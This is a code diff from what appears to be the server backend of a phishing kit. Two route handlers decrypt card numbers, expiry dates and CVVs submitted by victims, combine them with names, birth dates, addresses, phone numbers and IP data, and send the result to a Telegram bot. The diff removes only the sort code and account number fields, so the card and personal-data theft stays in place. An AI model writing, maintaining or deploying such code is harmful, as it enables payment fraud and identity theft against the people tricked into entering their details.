@@ -3511,12 +3511,6 @@ app.post("/F_zn66", (req, res) => {
   cvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
     CryptoJS.enc.Utf8
   );
-  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
-    CryptoJS.enc.Utf8
-  );
-  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
-    CryptoJS.enc.Utf8
-  );
   userAgent = req.body.userAgent;
   ip = req.body.ip;
   bin = req.body.bin;
@@ -3539,7 +3533,7 @@ app.post("/F_zn66", (req, res) => {
     })
     .then(function () {
       binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
-      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\nSort code: ${scode}\nAccount number: ${accno}+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
+      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
       if (F_zn66 == 7) {
         axios.post(
           `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
@@ -3589,12 +3583,6 @@ app.post("/hoodsEvri", (req, res) => {
   cvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
     CryptoJS.enc.Utf8
   );
-  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
-    CryptoJS.enc.Utf8
-  );
-  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
-    CryptoJS.enc.Utf8
-  );
   userAgent = req.body.userAgent;
   ip = req.body.ip;
   bin = req.body.bin;
@@ -3617,7 +3605,7 @@ app.post("/hoodsEvri", (req, res) => {
     })
     .then(function () {
       binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
-      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\nSort code: ${scode}\nAccount number: ${accno}+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
+      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
       if (hoods == 7) {
         axios.post(
           `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
